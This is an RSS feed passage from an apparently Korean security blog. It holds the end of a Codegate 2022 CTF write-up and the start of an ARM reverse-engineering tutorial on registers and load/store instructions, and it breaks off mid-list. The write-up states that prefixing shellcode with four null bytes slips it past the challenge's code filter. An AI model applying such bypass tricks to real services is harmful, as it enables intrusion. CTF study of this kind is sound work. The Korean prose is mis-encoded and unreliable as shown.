sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë”°ë¼ì„œ ì½”ë“œë¥¼ ì…ë ¥í•  ë•Œ <code>\x00\x00\x00\x00</code> ì´í›„ ì…¸ì½”ë“œë¥¼ ì…ë ¥í•˜ë©´ <code>check_code</code> í•¨ìˆ˜ë¥¼ í†µê³¼í•˜ì—¬ ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í’€ì´ëŠ” ì¶œì œìê°€ ë””ìŠ¤ì½”ë“œì—ì„œ ì˜ë„í•˜ì§€ ì•Šì€ í’€ì´ë¼ê³  ë°í˜”ìŠµë‹ˆë‹¤.</p><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] ARM, â€œA5: ARM Instruction Set Encoding,â€ in <em>ARMÂ® Architecture Reference Manual ARMv7-A and ARMv7-R edition</em>. ARM Limited, 2018, pp. 191-216.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/CTF/">CTF</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/07/03/codegate22-arvm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>1. ARM ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ ê¸°ì´ˆ</title>
      <link>https://juhyun167.github.io/2022/07/02/arm-1-introduction/</link>
      <guid>https://juhyun167.github.io/2022/07/02/arm-1-introduction/</guid>
      <pubDate>Sat, 02 Jul 2022 01:14:59 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;p&gt;ARM ì•„í‚¤í…ì²˜ì˜ íŠ¹ì§•ê³¼ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì´í•´í•˜ê³ , ê¸°ì´ˆì ì¸ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ì„ ì—°ìŠµí•´ ë³´ê² ìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;arm-%EC%95%84%ED%82%A</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><p>ARM ì•„í‚¤í…ì²˜ì˜ íŠ¹ì§•ê³¼ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì´í•´í•˜ê³ , ê¸°ì´ˆì ì¸ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ì„ ì—°ìŠµí•´ ë³´ê² ìŠµë‹ˆë‹¤.</p><h2 id="arm-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98-%EC%86%8C%EA%B0%9C" tabindex="-1">ARM ì•„í‚¤í…ì²˜ ì†Œê°œ</h2><p>1980ë…„ëŒ€ í›„ë°˜ ê°œë°œëœ ARM ì•„í‚¤í…ì²˜ëŠ” íœ´ëŒ€í°, ìë™ì°¨, í…”ë ˆë¹„ì „ ë“± ë‹¤ì–‘í•œ ì„ë² ë””ë“œ ì¥ì¹˜ì—ì„œ ì‚¬ìš©ë˜ê³  ìˆìŠµë‹ˆë‹¤. ARM ì•„í‚¤í…ì²˜ëŠ” ARM í™€ë”©ìŠ¤ê°€ ë””ìì¸í•œ í›„ ë‹¤ë¥¸ íšŒì‚¬ë“¤ì— ë¼ì´ì„¼ìŠ¤ë¥¼ íŒë§¤í•˜ë©°, ì• í”Œ, í€„ì»´ê³¼ ê°™ì€ íŒŒíŠ¸ë„ˆì‚¬ëŠ” ë¼ì´ì„¼ìŠ¤ë¥¼ êµ¬ë§¤í•˜ì—¬ ìì‹ ë“¤ì˜ ì¥ì¹˜ì— ì‚¬ìš©í•  í”„ë¡œì„¸ì„œì— ì ìš©í•©ë‹ˆë‹¤. ì´ë“¤ í”„ë¡œì„¸ì„œëŠ” ëª¨ë‘ ARM ë ˆí¼ëŸ°ìŠ¤ ë§¤ë‰´ì–¼ì— ì •ì˜ëœ ê¸°ë³¸ì ì¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì§‘í•©ê³¼ ë©”ëª¨ë¦¬ ëª¨ë¸ì„ êµ¬í˜„í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/arm-1-introduction/1.png" alt="1.png"></p><h2 id="arm-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98%EC%9D%98-%ED%8A%B9%EC%A7%95" tabindex="-1">ARM ì•„í‚¤í…ì²˜ì˜ íŠ¹ì§•</h2><p>ARMì€ RISC ì•„í‚¤í…ì²˜ë¡œ, CISC ì•„í‚¤í…ì²˜ì¸ x86/x64ì™€ëŠ” ëª‡ ê°€ì§€ ë‹¤ë¥¸ ì ì´ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ARM ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì§‘í•©ì€ x86/64ì— ë¹„í•´ ì‘ì§€ë§Œ, ë²”ìš© ë ˆì§€ìŠ¤í„°ì˜ ìˆ˜ëŠ” ë” ë§ìŠµë‹ˆë‹¤.</li><li>ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê¸¸ì´ê°€ ê³ ì •ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</li><li>ë©”ëª¨ë¦¬ ì ‘ê·¼ì— load-store ëª¨ë¸ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.<ul><li>ë°ì´í„°ë¥¼ ì—°ì‚°í•˜ê¸° ì „ ë°˜ë“œì‹œ ë©”ëª¨ë¦¬ì—ì„œ ë ˆì§€ìŠ¤í„°ë¡œ ì˜®ê²¨ì•¼ í•˜ë©°, ì˜¤ì§ loadì™€ store ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë§Œ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li></ol><p>ARMì€ ì—¬ëŸ¬ ê°€ì§€ì˜ ì„œë¡œ ë‹¤ë¥¸ íŠ¹ê¶Œ ìˆ˜ì¤€(privileged modes)ì„ ì œê³µí•˜ëŠ”ë°, ì¼ë‹¨ì€ í¸ì˜ë¥¼ ìœ„í•´ Userë¥¼ x86/64ì—ì„œì˜ Ring 3, Supervisorë¥¼ Ring 0ë¡œ ìƒê°í•´ë„ ì¢‹ìŠµë‹ˆë‹¤.</p><p><img src="/images/arm-1-introduction/2.jpg" alt="2.jpg"></p><p>ARM í”„ë¡œì„¸ì„œëŠ” ë‘ ê°€ì§€ ìƒíƒœ(state), ARMê³¼ Thumbìœ¼ë¡œ ë™ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ ìƒíƒœëŠ” ì‚¬ìš©í•  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì§‘í•©ê³¼ ê´€ë ¨ì´ ìˆìœ¼ë©°, íŠ¹ê¶Œ ìˆ˜ì¤€ê³¼ëŠ” ë¬´ê´€í•©ë‹ˆë‹¤. ARM ìƒíƒœì—ì„œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê¸¸ì´ëŠ” í•­ìƒ 32ë¹„íŠ¸ì´ë©°, Thumb ìƒíƒœì—ì„œëŠ” 16ë¹„íŠ¸ ë˜ëŠ” 32ë¹„íŠ¸ì…ë‹ˆë‹¤.</p><p>í”„ë¡œì„¸ì„œì˜ ìƒíƒœëŠ” ë‹¤ìŒê³¼ ê°™ì´ ê²°ì •ë©ë‹ˆë‹¤.</p><ol><li><code>BX</code> ë˜ëŠ” <code>BLX</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ë¶„ê¸°í•  ë•Œ, ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ì˜ ìµœí•˜ìœ„ ë¹„íŠ¸(LSB)ê°€ 1ì´ë©´ Thumb ìƒíƒœë¡œ ì „í™˜í•©ë‹ˆë‹¤.</li><li>í˜„ì¬ <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì˜ <code>T</code> ë¹„íŠ¸ê°€ 1ì´ë©´ Thumb ìƒíƒœì…ë‹ˆë‹¤.</li></ol><p>ëŒ€ë¶€ë¶„ì˜ ARMê³¼ Thumb ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë™ì¼í•œ ë‹ˆëª¨ë‹‰(mnemonic)ì„ ê°–ê³  ìˆì§€ë§Œ, Thumb ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì¤‘ ê¸¸ì´ê°€ 32ë¹„íŠ¸ì¸ ê²ƒì€ <code>.w</code> ì ‘ë¯¸ì‚¬ê°€ ë¶™ìŠµë‹ˆë‹¤.</p><p>ARMì€ ë˜í•œ ì¡°ê±´ë¶€ ì‹¤í–‰(conditional execution)ì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— íŠ¹ì •í•œ ì¡°ê±´ì´ í•¨ê»˜ ì¸ì½”ë”©ë˜ì–´ ìˆê³ , ì´ ì¡°ê±´ì„ ë§Œì¡±í•˜ëŠ” ê²½ìš°ì—ë§Œ ì‹¤í–‰ë¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì¡°ê±´ë¶€ ì‹¤í–‰ì„ ì‚¬ìš©í•˜ë©´ ë¶„ê¸°ë¬¸ì— í•„ìš”í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê°œìˆ˜ë¥¼ ì¤„ì¼ ìˆ˜ ìˆì–´ ìœ ìš©í•©ë‹ˆë‹¤. ARM ìƒíƒœì—ì„œ ëª¨ë“  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ì¡°ê±´ë¶€ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ì§€ë§Œ, ì¡°ê±´ì˜ ê¸°ë³¸ê°’ì€ â€˜í•­ìƒ ì‹¤í–‰í•¨(<code>AL</code>)â€™ ì…ë‹ˆë‹¤. Thumb ìƒíƒœì—ì„œëŠ” íŠ¹ë³„í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ <code>IT</code> ë¥¼ ì‚¬ìš©í•´ì•¼ë§Œ ì¡°ê±´ë¶€ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ë˜ ë‹¤ë¥¸ ARMì˜ ë…íŠ¹í•œ ê¸°ëŠ¥ì€ ë°°ëŸ´ ì‹œí”„í„°(barrel shifter)ë¡œ, íŠ¹ì •í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê°’ì„ ì‹œí”„íŠ¸í•˜ê±°ë‚˜ íšŒì „(rotate)ì‹œí‚¤ëŠ” ë‹¤ë¥¸ ì—°ì‚°ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (e.g. <code>MOV R1, R0, LSL #1</code> ì€ <code>R0</code> ë ˆì§€ìŠ¤í„°ë¥¼ ì™¼ìª½ìœ¼ë¡œ 1ë¹„íŠ¸ ì‹œí”„íŠ¸í•œ í›„ <code>R1</code> ë ˆì§€ìŠ¤í„°ì— ëŒ€ì…í•©ë‹ˆë‹¤) ë°°ëŸ´ ì‹œí”„í„°ëŠ” ì¡°ê±´ë¶€ ì‹¤í–‰ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê°œìˆ˜ë¥¼ ì¤„ì´ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.</p><h2 id="%EB%B2%94%EC%9A%A9-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0" tabindex="-1">ë²”ìš© ë ˆì§€ìŠ¤í„°</h2><p>ARM ì•„í‚¤í…ì²˜ëŠ” 16ê°œì˜ 32ë¹„íŠ¸ ë²”ìš© ë ˆì§€ìŠ¤í„° <code>R0</code> , <code>R1</code> , â€¦ , <code>R15</code> ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ëª¨ë“  ë²”ìš© ë ˆì§€ìŠ¤í„°ëŠ” ê°œë°œìê°€ ììœ ë¡­ê²Œ ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ, ì‹¤ì œë¡œëŠ” ì•ì˜ 12ê°œ ë ˆì§€ìŠ¤í„°ë§Œ ë²”ìš©ìœ¼ë¡œ ì“°ì´ê³  ë‚˜ë¨¸ì§€ëŠ” íŠ¹ìˆ˜ ë ˆì§€ìŠ¤í„°ì²˜ëŸ¼ ì‚¬ìš©ë©ë‹ˆë‹¤.</p><ul><li><code>R13</code> ì€ ìŠ¤íƒ í¬ì¸í„°(<code>SP</code>)ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.</li><li><code>R14</code> ëŠ” ë§í¬ ë ˆì§€ìŠ¤í„°(<code>LR</code>)ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.<ul><li>ë§í¬ ë ˆì§€ìŠ¤í„°(link register)ëŠ” í•¨ìˆ˜ì˜ ë¦¬í„´ ì£¼ì†Œë¥¼ ë³´ê´€í•˜ëŠ” ë ˆì§€ìŠ¤í„°ë¡œ, ì¼ë¶€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— ì˜í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. (e.g. <code>BL</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ í•­ìƒ <code>LR</code> ì— ë¦¬í„´ ì£¼ì†Œë¥¼ ì €ì¥í•©ë‹ˆë‹¤)</li></ul></li><li><code>R15</code> ëŠ” í”„ë¡œê·¸ë¨ ì¹´ìš´í„°(<code>PC</code>)ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.<ul><li>ARM ìƒíƒœì—ì„œ <code>PC</code> ëŠ” x86/64ì™€ëŠ” ë‹¤ë¥´ê²Œ, í˜„ì¬ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œì— 8ì„ ë”í•œ ê°’ì…ë‹ˆë‹¤. (ARM ì¸ìŠ¤íŠ¸ëŸ­ì…˜ 2ê°œ ë’¤ì˜ ì£¼ì†Œ)</li><li>Thumb ìƒíƒœì—ì„œ <code>PC</code> ëŠ” í˜„ì¬ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œì— 4ë¥¼ ë”í•œ ê°’ì…ë‹ˆë‹¤. (Thumb ì¸ìŠ¤íŠ¸ëŸ­ì…˜ 2ê°œ ë’¤ì˜ ì£¼ì†Œ)</li><li><code>PC</code> ë ˆì§€ìŠ¤í„°ì— ì£¼ì†Œë¥¼ ëŒ€ì…í•  ìˆ˜ ìˆìœ¼ë©°, ëŒ€ì… ì¦‰ì‹œ ê·¸ ì£¼ì†Œë¶€í„° ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.</li><li><code>gdb</code> ë””ë²„ê±°ì—ì„œëŠ” <code>PC</code> ë ˆì§€ìŠ¤í„°ì˜ ê°’ìœ¼ë¡œ í˜„ì¬ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¥¼ ë³´ì—¬ì£¼ëŠ”ë°, ì´ëŠ” í¸ì˜ìƒ <code>PC</code> ê°€ aliasë˜ì–´ìˆê¸° ë•Œë¬¸ì— ê·¸ëŸ° ê²ƒìœ¼ë¡œ ì‹¤ì œì™€ëŠ” ì°¨ì´ê°€ ìˆìŒì— ìœ ì˜í•©ë‹ˆë‹¤.</li></ul></li></ul><p>ARMì€ í˜„ì¬ í”„ë¡œì„¸ì„œì™€ ì‹¤í–‰ íë¦„ì˜ ìƒíƒœë¥¼ <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì— ë³´ê´€í•©ë‹ˆë‹¤. (<code>APSR</code> ë ˆì§€ìŠ¤í„°ë¼ê³ ë„ í•©ë‹ˆë‹¤) <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì—ëŠ” ë‹¤ìŒì„ í¬í•¨í•œ ë‹¤ì–‘í•œ í”Œë˜ê·¸ë“¤ì´ ìˆìŠµë‹ˆë‹¤.</p><ul><li><code>E</code> (ì—”ë””ì–¸ ë¹„íŠ¸) - ARMì€ ë¹… ì—”ë””ì–¸ ëª¨ë“œì™€ ë¦¬í‹€ ì—”ë””ì–¸ ëª¨ë“œ ëª¨ë‘ì—ì„œ ë™ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>ë¦¬í‹€ ì—”ë””ì–¸ì€ 0, ë¹… ì—”ë””ì–¸ì€ 1ì´ë©° ëŒ€ë¶€ë¶„ì˜ ê²½ìš° ë¦¬í‹€ ì—”ë””ì–¸ì…ë‹ˆë‹¤.</li></ul></li><li><code>T</code> (Thumb ë¹„íŠ¸) - Thumb ìƒíƒœì¸ ê²½ìš° 1ì…ë‹ˆë‹¤.</li><li><code>M</code> (Mode í•„ë“œ) - í˜„ì¬ íŠ¹ê¶Œ ìˆ˜ì¤€(e.g. User, Supervisor)ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.</li></ul><p><img src="/images/arm-1-introduction/3.png" alt="3.png"></p><h2 id="%EB%B3%B4%EC%A1%B0-%ED%94%84%EB%A1%9C%EC%84%B8%EC%84%9C%EC%99%80-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EC%84%A4%EC%A0%95" tabindex="-1">ë³´ì¡° í”„ë¡œì„¸ì„œì™€ ì‹œìŠ¤í…œ ì„¤ì •</h2><p>ARM ì•„í‚¤í…ì²˜ëŠ” í™•ì¥ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ê³¼ ì‹œìŠ¤í…œ ì„¤ì •ì„ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ë³´ì¡° í”„ë¡œì„¸ì„œ(coprocessors)ë¥¼ ì œê³µí•©ë‹ˆë‹¤. (e.g. x86/64ì—ì„œëŠ” ì‹œìŠ¤í…œ ì„¤ì •ì„ <code>CR0</code> , <code>CR4</code> ë ˆì§€ìŠ¤í„°ì—, ARMì—ì„œëŠ” <code>CP15</code> ë ˆì§€ìŠ¤í„°ì— ë³´ê´€í•©ë‹ˆë‹¤) ë³´ì¡° í”„ë¡œì„¸ì„œëŠ” <code>CP0</code> , <code>CP1</code> , â€¦ , <code>CP15</code> ì˜ 16ê°œê°€ ì¡´ì¬í•©ë‹ˆë‹¤. (ì½”ë“œì—ì„œëŠ” <code>P0</code> , â€¦ , <code>P15</code> ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤) <code>CP14</code> ì™€ <code>CP15</code> ëŠ” ë””ë²„ê¹…ê³¼ ì‹œìŠ¤í…œ ì„¤ì •ì„ ìœ„í•´ ì‚¬ìš©ë˜ê³ , ë‚˜ë¨¸ì§€ëŠ” ì œì¡°ì‚¬ê°€ íŠ¹ì •í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„(e.g. ë¶€ë™ì†Œìˆ˜ì  ì—°ì‚°) êµ¬í˜„í•˜ê¸° ìœ„í•´ ì„ íƒì ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ê°ê°ì˜ ë³´ì¡° í”„ë¡œì„¸ì„œëŠ” 16ê°œì˜ ë ˆì§€ìŠ¤í„°ì™€ 8ê°œì˜ opcodeë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©°, opcodeì˜ ì‹œë§¨í‹±(semantic)ì€ í”„ë¡œì„¸ì„œë§ˆë‹¤ ë‹¤ë¦…ë‹ˆë‹¤. ë³´ì¡° í”„ë¡œì„¸ì„œì— ëŒ€í•œ ì ‘ê·¼ì€ ì˜¤ì§ <code>MRC</code> , <code>MCR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•œ ì½ê¸°ì™€ ì“°ê¸°ë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤. (e.g. <code>MRC P15, 0, R0, C2, C0, 0</code> ì€ ë³´ì¡° í”„ë¡œì„¸ì„œ <code>CP15</code> ì˜ <code>C2</code> / <code>C0</code> ë ˆì§€ìŠ¤í„°ë¥¼ opcode <code>0</code> / <code>0</code> ìœ¼ë¡œ ì½ì–´ ë²”ìš© ë ˆì§€ìŠ¤í„° <code>R0</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤) <code>MRC</code> ì™€ <code>MCR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ìì²´ëŠ” ë†’ì€ íŠ¹ê¶Œ ìˆ˜ì¤€ì„ ìš”êµ¬í•˜ì§€ ì•Šì§€ë§Œ, ì¼ë¶€ ë³´ì¡° í”„ë¡œì„¸ì„œì˜ ë ˆì§€ìŠ¤í„°ì™€ opcodeë“¤ì€ ì˜¤ë¡œì§€ Supervisor ìˆ˜ì¤€ì—ì„œë§Œ ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ë“¤ ë ˆì§€ìŠ¤í„°ë¥¼ User ìˆ˜ì¤€ì—ì„œ ì½ìœ¼ë ¤ í•˜ë©´ ìµì…‰ì…˜ì´ ë°œìƒí•  ê²ƒì…ë‹ˆë‹¤.</p><h2 id="%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98-%EC%A7%91%ED%95%A9%EC%9D%98-%ED%8A%B9%EC%A7%95" tabindex="-1">ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì§‘í•©ì˜ íŠ¹ì§•</h2><p>ì¡°ê±´ë¶€ ì‹¤í–‰ì´ë‚˜ ë°°ëŸ´ ì‹œí”„í„° ì™¸ì—ë„, ARM ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ëŠ” x86ì— ì—†ëŠ” íŠ¹ì§•ë“¤ì´ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ì¼ë¶€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë ˆì§€ìŠ¤í„°ì˜ ë²”ìœ„ë¥¼ ì¸ìë¡œ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>e.g. <code>STM R1, &#123;R6-R10&#125;</code> ì€ ë ˆì§€ìŠ¤í„° <code>R1</code> ì´ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì— <code>R6</code> , <code>R7</code> , â€¦ , <code>R10</code> ì˜ 5ê°œ ê°’ì„ ìˆœì„œëŒ€ë¡œ ì”ë‹ˆë‹¤.</li><li>ì—°ì†í•˜ì§€ ì•ŠëŠ” ë ˆì§€ìŠ¤í„°ë“¤ë„ ì‰¼í‘œë¥¼ ì‚¬ìš©í•´ì„œ(e.g. <code>&#123;R1,R5,R8&#125;</code>) ì¸ìë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>ì¼ë¶€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ì½ê¸°, ì“°ê¸° ì´í›„ ì„ íƒì ìœ¼ë¡œ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ì˜ ê°’ì„ ê°±ì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>e.g. <code>STM SP!, &#123;R6-R10&#125;</code> ì„ ì‹¤í–‰í•˜ë©´ <code>SP</code> ì˜ ê°’ì€ <code>R10</code> ì˜ ê°’ì´ ì“°ì¸ ì£¼ì†Œì˜ 4ë°”ì´íŠ¸ ë’¤ë¡œ ê°±ì‹ ë©ë‹ˆë‹¤.</li></ul></li></ol><h2 id="load%EC%99%80-store-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1">Loadì™€ Store ì¸ìŠ¤íŠ¸ëŸ­ì…˜</h2><h3 id="ldr-%EA%B3%BC-str" tabindex="-1"><code>LDR</code> ê³¼ <code>STR</code></h3><p><code>LDR</code> ê³¼ <code>STR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë©”ëª¨ë¦¬ì—ì„œ 1ë°”ì´íŠ¸, 2ë°”ì´íŠ¸ ë˜ëŠ” 4ë°”ì´íŠ¸ë¥¼ ì½ê³  ì”ë‹ˆë‹¤. ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ë¬¸ë²•ì€ ì‚´ì§ ë³µì¡í•œë°, ì˜¤í”„ì…‹ì„ ì§€ì •í•˜ê±°ë‚˜ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ê°±ì‹ í•˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ ë°©ë²•ì´ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ê°€ì¥ ë‹¨ìˆœí•œ ê²½ìš°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn]        <span class="comment">; Rt = *Rn</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn]        <span class="comment">; *Rn = Rt</span></span><br></pre></td></tr></table></figure><p><code>LDR</code> , <code>STR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ì™€ ì˜¤í”„ì…‹ì„ ì¸ìë¡œ ë°›ëŠ”ë°, ì˜¤í”„ì…‹ì˜ í˜•íƒœê°€ 3ê°€ì§€ ìˆê³  ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ê°±ì‹ í•˜ëŠ” ë°©ë²•ì´ 3ê°€ì§€ ìˆìŠµë‹ˆë‹¤. ë¨¼ì € 3ê°€ì§€ì˜ ì˜¤í”„ì…‹ í˜•íƒœë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><ol><li>ìƒìˆ˜ê°€ ì˜¤í”„ì…‹ì¸ ê²½ìš°<ul><li>ìƒìˆ˜ ê°’(immediate)ì€ ë‹¨ìˆœíˆ ì •ìˆ˜ë¡œ, íŠ¹ì • ì˜¤í”„ì…‹ì˜ ë°ì´í„°ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ì— ë”í•˜ê±°ë‚˜ ë¹¼ëŠ” ê²½ìš°ì…ë‹ˆë‹¤. (e.g. êµ¬ì¡°ì²´, vtableì˜ íŠ¹ì • í•„ë“œ ì ‘ê·¼)</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, imm]   <span class="comment">; Rt = *(Rn + imm)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, imm]   <span class="comment">; *(Rn + imm) = Rt</span></span><br></pre></td></tr></table></figure><ol start="2"><li>ë ˆì§€ìŠ¤í„°ê°€ ì˜¤í”„ì…‹ì¸ ê²½ìš°<ul><li>ë³´í†µ ë°°ì—´ì— ì ‘ê·¼í•˜ëŠ”ë°, ì¸ë±ìŠ¤ê°€ ëŸ°íƒ€ì„ì— ê³„ì‚°ë˜ëŠ” ê²½ìš°ì…ë‹ˆë‹¤.</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, Rm]    <span class="comment">; Rt = *(Rn + Rm)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, Rm]    <span class="comment">; *(Rn + Rm) = Rt</span></span><br></pre></td></tr></table></figure><ol start="3"><li>ë ˆì§€ìŠ¤í„°ì˜ ì •ìˆ˜ë°°ê°€ ì˜¤í”„ì…‹ì¸ ê²½ìš°<ul><li>ë³´í†µ ë°˜ë³µë¬¸ ì•ˆì—ì„œ ë°°ì—´ì„ ìˆœíšŒí•˜ë©´ì„œ, ì›ì†Œì˜ í¬ê¸° ë‹¨ìœ„ë¡œ í¬ì¸í„°ë¥¼ ì¦ê°€ì‹œí‚¤ëŠ” ê²½ìš°ì…ë‹ˆë‹¤.</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, Rm, shift]     <span class="comment">; Rt = *(Rn + Rm * shift)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, Rm, shift]     <span class="comment">; *(Rn + Rm * shift) = Rt</span></span><br></pre></td></tr></table></figure><p>ë‹¤ìŒìœ¼ë¡œ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ê°±ì‹ í•˜ëŠ” 3ê°€ì§€ ë°©ë²•ì…ë‹ˆë‹¤.</p><ol><li>ì˜¤í”„ì…‹ ë°©ì‹<ul><li>ê°€ì¥ ë‹¨ìˆœí•˜ê³  í”í•œ ë°©ì‹ìœ¼ë¡œ, 